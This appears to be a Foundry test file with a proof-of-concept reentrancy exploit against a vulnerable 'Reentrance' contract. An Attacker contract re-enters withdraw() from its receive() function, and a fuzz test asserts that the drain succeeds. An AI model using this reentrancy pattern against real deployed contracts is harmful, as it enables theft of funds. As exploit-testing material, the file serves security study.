
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract TestReentrancyReentrance is Test {
    Reentrance public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrance();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsWithdrawMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // The vulnerable withdraw function requires the caller to have a balance in the contract

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 2);
        
        // B. Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // C. Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrance public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = Reentrance(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        // Deposit funds into the victim contract to establish a balance
        _victim.donate{value: val}(address(this));
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialSnapshot = address(this).balance;

        // 2. Store the value for the re-entrant call
        storedAttackVal = val;

        // 3. Call the vulnerable function
        _victim.withdraw(val);

        // 4. Verify Success Conditions
        // If we managed to call withdraw multiple times, the attack succeeded
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter the contract using the stored value
            _victim.withdraw(storedAttackVal);
        }
    }
}
